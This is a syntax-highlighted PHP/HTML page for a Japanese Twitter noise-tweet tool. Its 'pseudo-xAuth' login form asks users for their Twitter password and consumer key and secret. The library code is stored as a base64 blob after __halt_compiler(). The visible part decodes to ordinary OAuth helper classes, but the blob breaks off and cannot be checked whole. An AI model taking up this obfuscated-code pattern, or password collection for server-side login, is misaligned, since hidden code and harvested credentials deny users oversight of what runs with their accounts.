  <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css"</span> <span class="p">/&gt;</span>
  <span class="cp">&lt;![CDATA[&lt;!--[if lte IE 9]&gt;</span>
<span class="cp">    &lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt;</span>
<span class="cp">    &lt;script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"&gt;&lt;/script&gt;</span>
<span class="cp">  &lt;![endif]--&gt;]]&gt;</span>
  <span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span><span class="p">&gt;</span>
  <span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span>
    <span class="nt">body</span> <span class="p">{</span>
      <span class="k">font-family</span><span class="p">:</span> <span class="kc">monospace</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">container</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">900</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">box-group</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">450</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">button-group</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">450</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="o">]]&gt;</span>
  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-horizontal"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"jumbotron"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>ノイズ入れるやつ<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">accessToken</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>汚いツイートしたり藤原竜也になったりできるよ。<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>自分のコンシューマーキーを設定できるよ。<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>通常のOAuth認証と疑似xAuth認証の両方に対応してるよ。<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">else</span><span class="o">:</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">"text-align:right;"</span><span class="p">&gt;</span>
        <span class="cp">&lt;?</span><span class="o">=</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'&lt;a href="https://twitter.com/%1$s" target="_blank"&gt;@%1$s&lt;/a&gt;'</span><span class="p">,</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">screenName</span><span class="p">)</span><span class="cp">?&gt;</span>でログイン中
        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-warning"</span> <span class="na">name</span><span class="o">=</span><span class="s">"logout"</span> <span class="na">value</span><span class="o">=</span><span class="s">"ログアウト"</span> <span class="p">/&gt;</span>
      <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$msgs</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"alert alert-</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"page-header"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">accessToken</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>ログイン<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"box-group"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>＠<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"疑似xAuth認証の場合入力必須"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>PW<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"疑似xAuth認証の場合入力必須"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>CK<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"consumer_key"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$consumer_key</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"自由設定"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>CS<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"consumer_secret"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$consumer_secret</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"自由設定"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"button-group"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-primary btn-lg"</span> <span class="na">name</span><span class="o">=</span><span class="s">"oauth_start"</span> <span class="na">value</span><span class="o">=</span><span class="s">"OAuth認証"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-warning btn-lg"</span> <span class="na">name</span><span class="o">=</span><span class="s">"para_xauth"</span> <span class="na">value</span><span class="o">=</span><span class="s">"疑似xAuth認証"</span> <span class="p">/&gt;</span>
      <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">else</span><span class="o">:</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>基本設定<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"box-group"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>ヘッダー<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"header"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$header</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>本　　文<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>フッター<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">name</span><span class="o">=</span><span class="s">"footer"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$footer</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>濃　　度<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">"density"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
              <span class="p">&lt;</span><span class="nt">option</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$i</span><span class="o">===</span><span class="nv">$density</span><span class="o">?</span><span class="s1">' selected="selected"'</span><span class="o">:</span><span class="s1">''</span><span class="cp">?&gt;</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$i</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endfor</span><span class="p">;</span> <span class="cp">?&gt;</span>
            <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>オプション<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"box-group"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>
              <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"fujiwara"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$fujiwara</span><span class="o">?</span><span class="s1">' checked="checked"'</span><span class="o">:</span><span class="s1">''</span><span class="cp">?&gt;</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span><span class="p">&gt;</span>藤原竜也<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group input-group-lg"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"input-group-addon"</span><span class="p">&gt;</span>
              <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"auto_in_reply_to_status_id"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$auto_in_reply_to_status_id</span><span class="o">?</span><span class="s1">' checked="checked"'</span><span class="o">:</span><span class="s1">''</span><span class="cp">?&gt;</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span><span class="p">&gt;&lt;</span><span class="nt">code</span><span class="p">&gt;</span>in_reply_to_status_id<span class="p">&lt;/</span><span class="nt">code</span><span class="p">&gt;</span>自動付加<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>実行<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"button-group"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-primary"</span> <span class="na">name</span><span class="o">=</span><span class="s">"tweet"</span> <span class="na">value</span><span class="o">=</span><span class="s">"ツイートする"</span> <span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>
<span class="cm">/* †数々の関数やクラスはこの中に秘められている† */</span>
<span class="nb">__halt_compiler</span><span class="p">();</span>
<span class="nx">ZnVuY3Rpb24gaCgkaW5wdXQpe3JldHVybiBodG1sc3BlY2lhbGNoYXJzKCRpbnB1dCxFTlRfUVVPVEVTLCdVVEYtOCcpO31mdW5jdGlvbiBleHRlbnNpYmxlX3Nlc3Npb25fc3RhcnQoJGxpZmV0aW1lPTApe3Nlc3Npb25fc2V0X2Nvb2tpZV9wYXJhbXMoJGxpZmV0aW1lLCcvJywnJyxmYWxzZSx0cnVlKTskbmFtZT1zZXNzaW9uX25hbWUoKTtpZihpc3NldCgkX0NPT0tJRVskbmFtZV0pKXtpZighY3R5cGVfYWxudW0oJF9DT09LSUVbJG5hbWVdKSl7dW5zZXQoJF9DT09LSUVbJG5hbWVdKTt9ZWxzZWlmKCRsaWZldGltZT4wKXtzZXRjb29raWUoJG5hbWUsJF9DT09LSUVbJG5hbWVdLHRpbWUoKSskbGlmZXRpbWUsJy8nLCcnLGZhbHNlLHRydWUpO319cmV0dXJuIHNlc3Npb25fc3RhcnQoKTt9YWJzdHJhY3QgY2xhc3MgVHdpc3RCYXNle2ZpbmFsIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gZmlsdGVyKCRpbnB1dCwkYXJyYXlfZGVtZW50aW9uPTApeyRhcnJheV9kZW1lbnRpb249KGludCkkYXJyYXlfZGVtZW50aW9uO2lmKCRhcnJheV9kZW1lbnRpb248MSl7c3dpdGNoKHRydWUpe2Nhc2UgaXNfYXJyYXkoJGlucHV0KTpjYXNlIGlzX29iamVjdCgkaW5wdXQpYW5kIW1ldGhvZF9leGlzdHMoJGlucHV0LCdfX3RvU3RyaW5nJyk6cmV0dXJuJyc7fXJldHVybihzdHJpbmcpJGlucHV0O30kb3V0cHV0PWFycmF5KCk7Zm9yZWFjaCgoYXJyYXkpJGlucHV0IGFzICRrZXk9PiR2YWx1ZSl7JG91dHB1dFtzZWxmOjpmaWx0ZXIoJGtleSldPXNlbGY6OmZpbHRlcigkdmFsdWUsJGFycmF5X2RlbWVudGlvbi0xKTt9cmV0dXJuICRvdXRwdXQ7fX1jbGFzcyBUd2lzdENyZWRlbnRpYWwgZXh0ZW5kcyBUd2lzdEJhc2V7cHJpdmF0ZSAkdXNlckFnZW50PSdUd2lzdE9BdXRoJztwcml2YXRlICRjb25zdW1lcktleT0nJztwcml2YXRlICRjb25zdW1lclNlY3JldD0nJztwcml2YXRlICRyZXF1ZXN0VG9rZW49Jyc7cHJpdmF0ZSAkcmVxdWVzdFRva2VuU2VjcmV0PScnO3ByaXZhdGUgJGFjY2Vzc1Rva2VuPScnO3ByaXZhdGUgJGFjY2Vzc1Rva2VuU2VjcmV0PScnO3ByaXZhdGUgJHVzZXJJZD0nJztwcml2YXRlICRzY3JlZW5OYW1lPScnO3ByaXZhdGUgJHBhc3N3b3JkPScnO3ByaXZhdGUgJGF1dGhlbnRpY2l0eVRva2VuPScnO3ByaXZhdGUgJHZlcmlmaWVyPScnO3ByaXZhdGUgJGhpc3Rvcnk9YXJyYXkoKTtwcml2YXRlICRjb29raWVzPWFycmF5KCk7ZmluYWwgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjb25zdW1lcktleT0nJywkY29uc3VtZXJTZWNyZXQ9JycsJGFjY2Vzc1Rva2VuPScnLCRhY2Nlc3NUb2tlblNlY3JldD0nJywkc2NyZWVuTmFtZT0nJywkcGFzc3dvcmQ9JycpeyR0aGlzLT5zZXRDb25zdW1lcigkY29uc3VtZXJLZXksJGNvbnN1bWVyU2VjcmV0KS0</span><span class="o">+</span><span class="nx">c2V0QWNjZXNzVG9rZW4oJGFjY2Vzc1Rva2VuLCRhY2Nlc3NUb2tlblNlY3JldCktPnNldFNjcmVlbk5hbWUoJHNjcmVlbk5hbWUpLT5zZXRQYXNzd29yZCgkcGFzc3dvcmQpO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gX190b1N0cmluZygpeyRzdHJpbmc9Jyc7aWYoJHRoaXMtPnNjcmVlbk5hbWUhPT0nJyl7JHN0cmluZy49IkB7JHRoaXMtPnNjcmVlbk5hbWV9Ijt9aWYoJHRoaXMtPnVzZXJJZCE9PScnKXskc3RyaW5nLj0iKCN7JHRoaXMtPnVzZXJJZH0pIjt9cmV0dXJuICRzdHJpbmc7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBfX2dldCgkbmFtZSl7aWYoIXByb3BlcnR5X2V4aXN0cygkdGhpcywkbmFtZT1zZWxmOjpmaWx0ZXIoJG5hbWUpKSl7dGhyb3cgbmV3IE91dE9mUmFuZ2VFeGNlcHRpb24oIkludmFsaWQgcHJvcGVydHkgbmFtZTogeyRuYW1lfSIpO31yZXR1cm4gJHRoaXMtPiRuYW1lO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gX19pc3NldCgkbmFtZSl7cmV0dXJuIGlzc2V0KCR0aGlzLT57c2VsZjo6ZmlsdGVyKCRuYW1lKX0pO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0VXNlckFnZW50KCR1c2VyQWdlbnQpeyR0aGlzLT51c2VyQWdlbnQ9c2VsZjo6ZmlsdGVyKCR1c2VyQWdlbnQpO3JldHVybiAkdGhpczt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIHNldENvbnN1bWVyKCRjb25zdW1lcktleT0nJywkY29uc3VtZXJTZWNyZXQ9JycpeyR0aGlzLT5jb25zdW1lcktleT1zZWxmOjpmaWx0ZXIoJGNvbnN1bWVyS2V5KTskdGhpcy0</span><span class="o">+</span><span class="nx">Y29uc3VtZXJTZWNyZXQ9c2VsZjo6ZmlsdGVyKCRjb25zdW1lclNlY3JldCk7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0UmVxdWVzdFRva2VuKCRyZXF1ZXN0VG9rZW49JycsJHJlcXVlc3RUb2tlblNlY3JldD0nJyl7JHRoaXMtPnJlcXVlc3RUb2tlbj1zZWxmOjpmaWx0ZXIoJHJlcXVlc3RUb2tlbik7JHRoaXMtPnJlcXVlc3RUb2tlblNlY3JldD1zZWxmOjpmaWx0ZXIoJHJlcXVlc3RUb2tlblNlY3JldCk7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0QWNjZXNzVG9rZW4oJGFjY2Vzc1Rva2VuPScnLCRhY2Nlc3NUb2tlblNlY3JldD0nJyl7JHRoaXMtPmFjY2Vzc1Rva2VuPXNlbGY6OmZpbHRlcigkYWNjZXNzVG9rZW4pOyR0aGlzLT5hY2Nlc3NUb2tlblNlY3JldD1zZWxmOjpmaWx0ZXIoJGFjY2Vzc1Rva2VuU2VjcmV0KTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzZXRVc2VySWQoJHVzZXJJZD0nJyl7JHRoaXMtPnVzZXJJZD1zZWxmOjpmaWx0ZXIoJHVzZXJJZCk7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0U2NyZWVuTmFtZSgkc2NyZWVuTmFtZT0nJyl7JHRoaXMtPnNjcmVlbk5hbWU9c2VsZjo6ZmlsdGVyKCRzY3JlZW5OYW1lKTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzZXRQYXNzd29yZCgkcGFzc3dvcmQ9JycpeyR0aGlzLT5wYXNzd29yZD1zZWxmOjpmaWx0ZXIoJHBhc3N3b3JkKTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzZXRBdXRoZW50aWNpdHlUb2tlbigkYXV0aGVudGljaXR5VG9rZW49JycpeyR0aGlzLT5hdXRoZW50aWNpdHlUb2tlbj1zZWxmOjpmaWx0ZXIoJGF1dGhlbnRpY2l0eVRva2VuKTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzZXRWZXJpZmllcigkdmVyaWZpZXI9JycpeyR0aGlzLT52ZXJpZmllcj1zZWxmOjpmaWx0ZXIoJHZlcmlmaWVyKTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBnZXRBdXRob3JpemVVcmwoJGZvcmNlX2xvZ2lu